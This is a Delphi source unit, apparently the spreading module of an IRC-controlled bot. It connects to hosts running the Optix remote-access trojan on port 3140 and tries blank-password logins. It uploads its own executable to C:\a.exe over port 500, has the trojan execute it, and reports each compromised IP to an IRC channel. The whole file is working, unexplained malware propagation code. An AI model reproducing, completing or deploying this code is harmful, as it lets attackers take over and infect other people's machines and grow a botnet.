unit pOptix;

interface

Uses
  Windows, Winsock, Bot;

Function Optix(IP: String): Bool;

implementation

function StrtoInt(const S: string): integer; var
E: integer; begin Val(S, Result, E); end;

function InttoStr(const Value: integer): string;
var S: string[11]; begin Str(Value, S); Result := S; end;

Function Optix(IP: String): Bool;
Var
  Buffer: Array[0..4000] Of Char;
  szBuffer: Array[0..64] Of Char;
  szFilePath: String;

  Read   : Cardinal; {0}
  WSAData: TWSAData;
  UPLData: TWSAData;
  Addr   : TSockAddrIn;
  Upl    : TSockAddrIn;
  Sock   : TSocket;
  uSock  : TSocket;

  IS11   : Bool; {False}
  Temp   : String;
  F      : THandle;
  hFile  : THandle;
  dwSize : Dword;
  Read_Bytes: DWord;
Label
  Start;
Begin
  Result := False;
  If WSAStartUp(MakeWord(2,2), WSAData) <> 0 Then Exit;

  Addr.sin_addr.S_addr := inet_addr(pchar(ip));
  Addr.sin_port := hTons(3140);
  Addr.sin_family := AF_INET;

  Sock := SOcket(AF_INET, SOCK_STREAM, 0);

Start:
  If Connect(Sock, Addr, SizeOf(Addr)) = SOCKET_ERROR Then
  Begin
    CloseSocket(Sock);
    WsaCleanUp;
    Exit;
  End;

  // Auth
  // Note: OPTIX blocks your connection if you fail the password three times.

  If (IS11) Then
    Temp := '022¬¬v1.1'#13#10
  Else
    Temp := '022¬¬v1.2'#13#10;
  Send(Sock, Temp[1], Length(Temp), 0);
  Sleep(500);

  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(Sock, szBuffer, SizeOf(szBuffer), 0);

  If Pos('001¬Your client version is outdated!',String(szBuffer)) > 0 Then
  Begin
    IS11 := True;
    CloseSocket(Sock);
    Goto Start;
  End;

  If Pos('001¬',String(szBuffer)) > 0 Then
  Begin
    Sleep(500);
    // If "OPTest" doesnt work, try a empty password.

    If (IS11) Then
      Temp := '022¬¬v1.1'#13#10
    Else
      Temp := '022¬¬v1.2'#13#10;
    Send(Sock, Temp[1], Length(Temp), 0);
    Sleep(500);

    FillChar(szBuffer, SizeOf(szBuffer), #0);
    Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
    If Pos('001¬', String(szBuffer)) > 0 Then
    Begin
      CloseSocket(Sock);
      WSACleanUp;
      Exit;
    End;
  End;

  Temp := '019¬'#13#10;
  Send(Sock, Temp[1], 6, 0);
  Sleep(500);

  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(Sock, szBuffer, SizeOf(szBuffer), 0);

  If Pos('020¬'#13#10, String(szBuffer)) > 0 Then
  Begin
    CloseSocket(Sock);
    WSACleanUp;
    Exit;
  End;

  szFilePath := ParamStr(0);
  F := CreateFile(pChar(szFilePath), GENERIC_READ, FILE_SHARE_READ, NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

  If WSAStartUp(MakeWord(2,2), UPLData) <> 0 Then
  Begin
    CloseSocket(Sock);
    WSACleanUp;
    Exit;
  End;

  upl.sin_addr.s_addr := inet_addr(pchar(ip));
  upl.sin_port := htons(500);
  upl.sin_family := af_inet;

  uSock := Socket(AF_INET, Sock_Stream, 0);

  If Connect(uSock, Upl, SizeOf(Upl)) = SOCKET_ERROR Then
  Begin
    CloseSocket( Sock);
    CloseSocket(uSock);
    WSACleanUp;
    Exit;
  End;

  hFile := CreateFile(pChar(szFilePath), GENERIC_READ, FILE_SHARE_READ, NIL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
  dwSize := GetFileSize(hFile, 0);
  CloseHandle(hFile);

  Temp := 'C:\a.exe'#13#10+inttostr(dwSize)+#13#10;
  Send(uSock, Temp[1], Length(Temp), 0);
  Sleep(500);

  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(uSock, szBuffer, SizeOf(szBuffer), 0);

  If Pos('+OK REDY', String(szBuffer)) = 0 Then
  Begin
    CloseSocket( Sock);
    CloseSocket(uSock);
    WSACleanUp;
    Exit;
  End;

  FillChar(szBuffer, SizeOf(szBuffer), #0);

  Read := 0;
  Repeat
    ReadFile(F, szBuffer, SizeOf(szBuffer), Read, 0);
    Send(uSock, szBuffer, Read, 0);
  Until read = 0;
  CloseHandle(F);

  FillChar(szBuffer, SizeOf(szBuffer), #0);
  Recv(uSock, szBuffer, SizeOf(szBuffer), 0);

  If Pos('+OK RCVD', string(szBuffer)) > 0 Then
  Begin
    CloseSocket(uSock);
    Temp := '008¬C:\a.exe'#13#10;
    Send(Sock, Temp[1], 14, 0);
    Sleep(500);

    FillChar(szBuffer, SizeOf(szBuffer), #0);
    Recv(Sock, szBuffer, SizeOf(szBuffer), 0);
    If (String(szBuffer) = '001¬Error Executing File'#13#10) Then
    Begin
      CloseSocket( Sock);
      CloseSocket(uSock);
      WSACleanUp;
      Exit;
    End;
  End Else
  Begin
    CloseSocket( Sock);
    CloseSocket(uSock);
    WSACleanUp;
    Exit;
  End;

  Temp := '100¬'#13#10;
  Send(Sock, Temp[1], Length(Temp), 0);
  CloseSocket( Sock);
  CloseSocket(uSock);
  WSACleanUp;

  Inc(Opx);
  SendData('PRIVMSG ##pktb :[OPTIX]Exploited '+IP+#10);
  Result := True;
End;

end.
